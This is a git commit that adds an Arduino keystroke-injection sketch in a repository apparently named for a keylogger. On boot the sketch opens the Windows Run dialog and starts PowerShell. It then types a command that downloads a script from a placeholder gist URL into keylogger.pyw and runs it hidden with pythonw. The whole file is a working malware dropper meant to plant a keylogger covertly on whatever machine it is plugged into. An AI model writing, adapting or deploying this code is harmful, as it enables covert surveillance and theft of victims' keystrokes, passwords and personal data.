675b7d1d8a1fe09788391a6fc93749ae4757ee90
rage <168290909+Sirage7474@users.noreply.github.com>
2025-05-30 16:13:34 +0200

    Created

---
+++ KeyloggerWithIp/example.ino
@@ -0,0 +1,48 @@
+#include <Keyboard.h>
+
+void typeAndEnter(const char* text, int waitAfter = 500) {
+  Keyboard.print(text);
+  delay(waitAfter);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(waitAfter);
+}
+
+void setup() {
+  Keyboard.begin();
+
+  delay(3000); 
+
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(200);
+  Keyboard.releaseAll();
+
+  delay(1000);
+  Keyboard.print("powershell");
+  delay(1000);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+
+  delay(2000); 
+
+ 
+  Keyboard.print("Invoke-WebRequest -Uri \"YOUR_GIST_FILE\" ");
+  Keyboard.print("| Select-Object -ExpandProperty Content ");
+  Keyboard.print("| Out-File -Encoding utf8 -Append keylogger.pyw");
+  delay(500);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+
+  delay(5000); 
+
+ 
+  typeAndEnter("pythonw keylogger.pyw", 1000);
+
+  Keyboard.end();
+}
+
+void loop() {
+
+}
